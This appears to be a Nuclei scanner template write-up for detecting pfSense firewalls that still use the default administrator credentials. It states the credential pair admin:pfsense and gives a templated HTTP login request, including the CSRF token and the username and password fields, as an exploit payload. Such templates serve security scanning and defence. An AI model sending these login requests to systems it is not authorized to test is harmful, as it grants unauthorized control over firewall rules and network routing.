# Nuclei Template: pfSense - Default Admin Credentials
**Template ID:** pfsense-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`pfsense-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected pfSense firewall was found using default administrator credentials (admin:pfsense). An attacker could have gained full administrative access to manage firewall rules, routing, and network configuration.

## Steps to reproduce / Exploit Payload
```http
GET /index.php HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept: text/html
Cookie: {{phpsessid}}

__csrf_magic={{csrf}}&usernamefld={{username}}&passwordfld={{password}}&login=Sign+In
```

## References
- https://docs.netgate.com/pfsense/en/latest/
